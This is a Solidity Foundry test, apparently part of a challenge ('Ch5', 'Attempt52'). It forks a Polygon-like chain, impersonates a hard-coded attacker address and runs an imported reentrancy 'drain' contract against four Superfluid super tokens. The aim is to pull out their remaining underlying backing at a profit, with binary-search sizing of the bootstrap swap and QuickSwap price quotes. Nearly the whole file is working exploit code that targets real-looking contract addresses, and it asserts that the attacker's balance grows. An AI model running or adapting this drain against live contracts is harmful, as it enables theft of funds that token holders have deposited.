// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {Ch5ERC20Drain, ISuperToken, IERC20Minimal, IQuickSwapRouter} from "../exploit/Run.s.sol";

/// @notice Current-head dust continuation probe after the large exploit run.
///         Uses target-sized bootstraps and skips tokens that do not clear a
///         conservative quoted profit margin.
contract Attempt52LiveDustContinuationTest is Test {
    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    address internal constant ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;
    address internal constant WMATIC = 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270;

    address internal constant USDCX = 0xCAa7349CEA390F89641fe306D93591f87595dc1F;
    address internal constant DAIX = 0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2;
    address internal constant ETHX = 0x27e1e4E6BC79D93032abef01025811B7E4727e85;
    address internal constant WBTCX = 0x4086eBf75233e8492F1BCDa41C7f2A8288c2fB92;

    uint256 internal constant BUY_MIN_BPS = 9_900;
    uint256 internal constant SELL_MIN_BPS = 9_900;
    uint256 internal constant MAX_REENTRY_COUNT = 20;
    uint256 internal constant MAX_ROUNDS_PER_HELPER = 1;
    uint256 internal constant GAS_RESERVE = 5 ether;
    uint256 internal constant DUST_PROFIT_MARGIN = 0.01 ether;

    uint32 internal constant USDC_INDEX_BASE = 720_000_000;
    uint32 internal constant DAI_INDEX_BASE = 730_000_000;
    uint32 internal constant ETH_INDEX_BASE = 735_000_000;
    uint32 internal constant WBTC_INDEX_BASE = 740_000_000;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_continue_current_head_dust_if_profitable() public {
        uint256 nativeBefore = ATTACKER.balance;

        vm.startPrank(ATTACKER);
        _drainDustTokenIfProfitable("USDCx dust", USDCX, USDC_INDEX_BASE);
        _drainDustTokenIfProfitable("DAIx dust", DAIX, DAI_INDEX_BASE);
        _drainDustTokenIfProfitable("ETHx dust", ETHX, ETH_INDEX_BASE);
        _drainDustTokenIfProfitable("WBTCx dust", WBTCX, WBTC_INDEX_BASE);
        vm.stopPrank();

        uint256 nativeAfter = ATTACKER.balance;
        console.log("attacker native before:", nativeBefore);
        console.log("attacker native after:", nativeAfter);
        console.log("attacker native delta:", nativeAfter - nativeBefore);

        assertGt(nativeAfter, nativeBefore, "dust continuation should increase native balance");
    }

    function _drainDustTokenIfProfitable(string memory label, address superToken, uint32 indexBase) internal {
        address underlying = ISuperToken(superToken).getUnderlyingToken();
        uint256 nativeBefore = ATTACKER.balance;
        uint256 backingBefore = IERC20Minimal(underlying).balanceOf(superToken);
        if (backingBefore <= 1) {
            console.log(label);
            console.log("backing already empty, skipping");
            return;
        }

        uint256 spendable = nativeBefore > GAS_RESERVE ? nativeBefore - GAS_RESERVE : 0;
        require(spendable > 0, "no spendable native");

        uint256 targetUnderlying = backingBefore / (MAX_REENTRY_COUNT + 2);
        require(targetUnderlying > 0, "target rounded to zero");

        uint256 bootstrapNative = _bootstrapForTargetUnderlying(underlying, targetUnderlying, spendable);
        require(bootstrapNative > 0 && bootstrapNative <= spendable, "bootstrap unavailable");

        (bool expectedProfit, uint256 expectedNativeOut, uint256 bootstrapUnderlying) =
            _quoteDustRound(underlying, backingBefore, targetUnderlying, bootstrapNative);

        console.log(label);
        console.log("native before token:", nativeBefore);
        console.log("backing before:", backingBefore);
        console.log("target underlying:", targetUnderlying);
        console.log("bootstrap native:", bootstrapNative);
        console.log("bootstrap underlying quote:", bootstrapUnderlying);
        console.log("expected native out quote:", expectedNativeOut);

        if (!expectedProfit) {
            console.log("quoted round below profit margin, skipping");
            return;
        }

        Ch5ERC20Drain drain = new Ch5ERC20Drain(superToken, ROUTER, indexBase, address(0));
        (uint256 roundsExecuted, uint256 nativeOut) =
            drain.executeDrain{value: bootstrapNative}(MAX_ROUNDS_PER_HELPER, MAX_REENTRY_COUNT);

        uint256 nativeAfter = ATTACKER.balance;
        uint256 backingAfter = IERC20Minimal(underlying).balanceOf(superToken);

        console.log("rounds executed:", roundsExecuted);
        console.log("helper native out:", nativeOut);
        console.log("native delta:", nativeAfter - nativeBefore);
        console.log("backing after:", backingAfter);

        assertGt(roundsExecuted, 0, "no rounds executed");
        assertGt(nativeAfter, nativeBefore, "token dust drain was not profitable");
        assertLt(backingAfter, backingBefore, "token backing unchanged");
    }

    function _bootstrapForTargetUnderlying(address underlying, uint256 targetUnderlying, uint256 maxNative)
        internal
        view
        returns (uint256 bootstrapNative)
    {
        if (targetUnderlying == 0 || maxNative == 0) {
            return 0;
        }

        uint256 quotedMax = _quoteNativeForUnderlying(underlying, maxNative);
        if (quotedMax <= targetUnderlying) {
            return maxNative;
        }

        uint256 low = 1;
        uint256 high = maxNative;
        while (low < high) {
            uint256 mid = low + ((high - low) >> 1);
            uint256 quoted = _quoteNativeForUnderlying(underlying, mid);
            if (quoted >= targetUnderlying) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }

        bootstrapNative = low + (low / 20) + 0.1 ether;
    }

    function _quoteDustRound(address underlying, uint256 backingUnderlying, uint256 seedUnderlying, uint256 bootstrapNative)
        internal
        view
        returns (bool expectedProfit, uint256 expectedNativeOut, uint256 bootstrapUnderlying)
    {
        bootstrapUnderlying = (_quoteNativeForUnderlying(underlying, bootstrapNative) * BUY_MIN_BPS) / 10_000;
        if (bootstrapUnderlying <= seedUnderlying) {
            return (false, 0, bootstrapUnderlying);
        }

        uint256 expectedUnderlyingAfter = bootstrapUnderlying + backingUnderlying - (seedUnderlying * 2);
        expectedNativeOut = (_quoteUnderlyingForNative(underlying, expectedUnderlyingAfter) * SELL_MIN_BPS) / 10_000;
        expectedProfit = expectedNativeOut > bootstrapNative + DUST_PROFIT_MARGIN;
    }

    function _quoteNativeForUnderlying(address underlying, uint256 amountIn) internal view returns (uint256 amountOut) {
        address[] memory path = new address[](2);
        path[0] = WMATIC;
        path[1] = underlying;
        amountOut = IQuickSwapRouter(ROUTER).getAmountsOut(amountIn, path)[1];
    }

    function _quoteUnderlyingForNative(address underlying, uint256 amountIn) internal view returns (uint256 amountOut) {
        address[] memory path = new address[](2);
        path[0] = underlying;
        path[1] = WMATIC;
        amountOut = IQuickSwapRouter(ROUTER).getAmountsOut(amountIn, path)[1];
    }
}
